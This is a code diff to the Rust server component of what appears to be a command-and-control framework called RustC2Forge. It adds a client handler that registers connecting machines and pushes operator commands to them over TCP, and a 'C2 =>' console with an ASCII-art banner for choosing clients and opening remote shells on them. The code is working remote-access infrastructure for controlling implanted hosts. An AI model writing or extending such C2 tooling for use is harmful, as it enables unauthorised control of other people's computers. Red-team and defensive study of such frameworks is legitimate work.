@@ -1,8 +1,95 @@
-use std::{io::{self, Write, BufRead, BufReader}, process};
-use crate::config::{ClientManager, ClientCommand};
-
-use std::net::TcpStream;
+use std::{io, process};
 use std::error::Error;
+use std::io::{BufRead, BufReader, Write};
+use std::net::TcpStream;
+use std::time::Instant;
+
+use crate::client::{ClientManager, ClientDetails, ClientConfig, ClientCommand};
+
+
+/// Handles an individual client connection.
+///
+/// Upon receiving a connection, it first expects to receive an initial configuration from the client.
+/// It then enters a loop where it waits for commands to execute on behalf of the client, sends these commands,
+/// and handles their outputs. Commands and their outputs are managed via `ClientManager`.
+///
+/// # Parameters
+///
+/// * `stream`: The TCP stream associated with the connected client.
+/// * `client_manager`: An instance of `ClientManager` to manage client details and commands.
+pub fn handle_client(stream: TcpStream, client_manager: ClientManager){
+    let ip = stream.peer_addr().unwrap().to_string();
+    let mut buffer = Vec::new();
+    let mut reader = BufReader::new(&stream);
+
+    // Initial configuration reception
+    if let Ok(_) = reader.read_until(b'\n', &mut buffer) {
+
+        match serde_json::from_slice::<ClientConfig>(&buffer) {
+            Ok(config) => {
+                client_manager.add_client(ip.clone(), ClientDetails {
+                    config,
+                    command: None,
+                    last_heartbeat: Instant::now(),
+                });
+            },
+            Err(e) => println!("[E] Failed to deserialize Client Config from \
+                               {}: {}", ip, e),
+        }
+    }
+
+    // Command processing loop
+    loop {
+        buffer.clear();
+        let cmd: Option<String> = client_manager.get_command(&ip);
+        if cmd != None {
+            let cmd = cmd.unwrap();
+            send_command(&stream, &cmd).unwrap();
+
+            let command: ClientCommand = command_output(&mut reader).unwrap();
+            println!("\n{}\n", command.output.unwrap());
+
+            client_manager.reset_command(&ip).unwrap();
+        }
+    }
+}
+
+/// A server loop that continuously accepts commands from the console to manage clients.
+///
+/// Commands include listing clients, terminating the server session, and initiating shell sessions
+/// with specific clients.
+///
+/// # Parameters
+///
+/// * `server_client_manager`: An instance of `ClientManager` used for client management.
+pub fn cli_server(server_client_manager: ClientManager) {
+    let mut cmd = String::new();
+    println!("
+
+    ██████╗ ██╗   ██╗███████╗████████╗ ██████╗██████╗ ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
+    ██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝╚════██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
+    ██████╔╝██║   ██║███████╗   ██║   ██║      █████╔╝█████╗  ██║   ██║██████╔╝██║  ███╗█████╗
+    ██╔══██╗██║   ██║╚════██║   ██║   ██║     ██╔═══╝ ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝
+    ██║  ██║╚██████╔╝███████║   ██║   ╚██████╗███████╗██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
+    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
+
+                                                                                by Co3lho22
+
+             ");
+
+    loop {
+        println!("C2 => ");
+        io::stdout().flush().unwrap();
+
+        cmd.clear();
+        io::stdin().read_line(&mut cmd).expect("Failed to read command");
+        cmd = cmd.trim_end().to_owned();
+
+        commands(&cmd, &server_client_manager);
+    }
+}
+
+
 
 /// Prints a help menu listing available commands.
 ///
@@ -46,7 +133,7 @@ fn shell(ip: String, server_client_manager: &ClientManager){
         and the output will be displayed in this shell.\n\
         Type 'exit' at any time to return to the main C2 Shell.\n",
         ip
-        );
+    );
 
     let mut cmd = String::new();
     loop {
@@ -113,6 +200,10 @@ pub fn commands(cmd: &String, server_client_manager: &ClientManager) {
     }
 }
 
+
+
+
+
 /// Sends a serialized command to the connected client via TCP stream.
 ///
 /// Serializes a given command into JSON format and sends it to the client. It ensures
@@ -131,10 +222,10 @@ pub fn commands(cmd: &String, server_client_manager: &ClientManager) {
 ///
 /// Returns an error if there is an issue with serializing the command or writing to the stream.
 pub fn send_command(mut stream: &TcpStream, cmd: &String) -> io::Result<()> {
-   let client_command = ClientCommand::new(cmd);
+    let client_command = ClientCommand::new(cmd);
 
-   let serialized_command = ClientCommand::to_json(&client_command).expect(
-       "Failed to serialize command") + "\n";
+    let serialized_command = ClientCommand::to_json(&client_command).expect(
+        "Failed to serialize command") + "\n";
 
     stream.write_all(serialized_command.as_bytes())?;
     stream.flush()?;
@@ -160,7 +251,7 @@ pub fn send_command(mut stream: &TcpStream, cmd: &String) -> io::Result<()> {
 /// - `Err(Box<dyn Error>)`: An error boxed as a trait object, if deserialization fails or
 ///   if there is an error reading from the stream.
 pub fn command_output(reader: &mut BufReader<&TcpStream>)
-    -> Result<ClientCommand, Box<dyn Error>> {
+                      -> Result<ClientCommand, Box<dyn Error>> {
 
     let mut buffer = Vec::new();
     match reader.read_until(b'\n', &mut buffer) {
